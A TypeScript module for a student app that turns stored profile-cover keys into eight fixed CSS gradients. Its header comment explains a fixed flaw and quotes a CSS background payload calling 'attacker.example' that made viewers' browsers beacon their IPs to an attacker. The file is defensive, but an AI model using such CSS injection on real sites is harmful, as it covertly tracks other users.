/**
 * Cover themes — the eight covers a student can pick for their profile banner.
 *
 * `public.users.banner_gradient` stores a KEY from this table, never CSS.
 * Before migration 20260912100000 it was a free-text CSS string that the
 * `authenticated` role could UPDATE straight through PostgREST, and it was
 * applied verbatim as a CSS `background` on other students' screens (Network
 * cards, the phone profile, the desktop profile, profile cards inside DMs and
 * the sidebar chip). `background` is a shorthand that accepts layered images,
 * so `linear-gradient(#000,#000), url(https://attacker.example/b.png)` made
 * every viewer's browser fetch a host the author controlled — an IP beacon
 * built out of a cover setting, with no CSP to stop it.
 *
 * So: the key travels, the CSS does not. `resolveCoverThemeCss` is the only
 * way a stored value becomes a style, and it can only ever return one of the
 * constants below.
 *
 * KEYS MUST MATCH, in three places:
 *   * `users_banner_gradient_preset_check` (supabase/migrations/20260912100000)
 *   * `VIBE_COVER_THEMES` in public/html/_persistence.js (the static pages
 *     are vanilla JS and cannot import this file)
 * Add a preset here and you must add it in both of those too — the same note
 * `orgs_backdrop_preset_check` carries, and the reason the org `cream`
 * backdrop silently fell back for months.
 *
 * The eight CSS values are byte-for-byte the eight swatches the desktop cover
 * picker has always offered, so no existing cover changes appearance.
 */

export const COVER_THEME_KEYS = [
  "peach-sky",
  "sky-peach",
  "mint-lilac",
  "sunrise",
  "ember-night",
  "deep-sea",
  "orchid",
  "pine",
] as const;

export type CoverThemeKey = (typeof COVER_THEME_KEYS)[number];

export const COVER_THEMES: Record<CoverThemeKey, { label: string; css: string }> = {
  "peach-sky": {
    label: "Peach sky",
    css: "linear-gradient(135deg,#FFB8A0 0%,#C8B8FF 45%,#B8E4FF 100%)",
  },
  "sky-peach": {
    label: "Sky peach",
    css: "linear-gradient(135deg,#B8E4FF 0%,#C8B8FF 50%,#FFB8A0 100%)",
  },
  "mint-lilac": {
    label: "Mint lilac",
    css: "linear-gradient(135deg,#EAFFF5 0%,#B8E4FF 50%,#C8B8FF 100%)",
  },
  sunrise: {
    label: "Sunrise",
    css: "linear-gradient(135deg,#FFF9E0 0%,#FFB8A0 50%,#FF5C35 100%)",
  },
  "ember-night": {
    label: "Ember night",
    css: "linear-gradient(135deg,#1C1C1E 0%,#2D1B4E 50%,#FF5C35 100%)",
  },
  "deep-sea": {
    label: "Deep sea",
    css: "linear-gradient(135deg,#0A1628 0%,#1A3A5C 50%,#2E86AB 100%)",
  },
  orchid: {
    label: "Orchid",
    css: "linear-gradient(135deg,#2D0A3E 0%,#6B21A8 50%,#C084FC 100%)",
  },
  pine: {
    label: "Pine",
    css: "linear-gradient(135deg,#0D2B1D 0%,#166534 50%,#4ADE80 100%)",
  },
};

/** The cover a student has when they've never picked one. */
export const DEFAULT_COVER_THEME: CoverThemeKey = "peach-sky";
export const DEFAULT_COVER_THEME_CSS = COVER_THEMES[DEFAULT_COVER_THEME].css;

export function isCoverThemeKey(v: unknown): v is CoverThemeKey {
  return typeof v === "string" && (COVER_THEME_KEYS as readonly string[]).includes(v);
}

/**
 * Normalize a CSS string for comparison: lowercased, whitespace removed, and
 * `rgb(r, g, b)` rewritten as `#rrggbb`. The rgb() form matters because
 * public/html/profile.html used to read the cover back out of the DOM
 * (`coverEl.style.background`), and the browser re-serializes hex colors as
 * rgb() — which is the exact shape the one live row was stored in.
 */
function canonicalCss(raw: string): string {
  return raw
    .toLowerCase()
    .replace(/\s+/g, "")
    .replace(
      /rgb\((\d{1,3}),(\d{1,3}),(\d{1,3})\)/g,
      (_m, r: string, g: string, b: string) =>
        `#${[r, g, b].map((n) => Number(n).toString(16).padStart(2, "0")).join("")}`,
    );
}

/** Canonical CSS → key, for values written by clients older than this change. */
const LEGACY_CSS_TO_KEY: ReadonlyMap<string, CoverThemeKey> = new Map(
  COVER_THEME_KEYS.map((k) => [canonicalCss(COVER_THEMES[k].css), k] as const),
);

/**
 * Stored value → the CSS to paint, or null for "no cover theme".
 *
 * Accepts a preset key (what is stored from now on) or one of the eight
 * preset CSS strings (what older clients wrote, and what is in the column
 * until the migration is applied). ANY other value — including a perfectly
 * valid-looking gradient that is not one of ours — returns null, so the
 * caller paints its own default. A value from the database can never come
 * out of this function.
 */
export function resolveCoverThemeCss(stored: unknown): string | null {
  if (typeof stored !== "string") return null;
  const t = stored.trim();
  if (!t) return null;
  if (isCoverThemeKey(t)) return COVER_THEMES[t].css;
  const legacy = LEGACY_CSS_TO_KEY.get(canonicalCss(t));
  return legacy ? COVER_THEMES[legacy].css : null;
}

/**
 * Write-side validator: client input → the key to store.
 *
 * Returns `""` for "clear the cover theme", a key for anything recognized,
 * and `null` for input the caller should reject with a 400. Defence in
 * depth only — the boundary is the CHECK constraint plus the missing UPDATE
 * grant, because this column is reachable without going through any route.
 */
export function normalizeCoverThemeInput(v: unknown): CoverThemeKey | "" | null {
  if (typeof v !== "string") return null;
  const t = v.trim();
  if (!t) return "";
  if (isCoverThemeKey(t)) return t;
  return LEGACY_CSS_TO_KEY.get(canonicalCss(t)) ?? null;
}
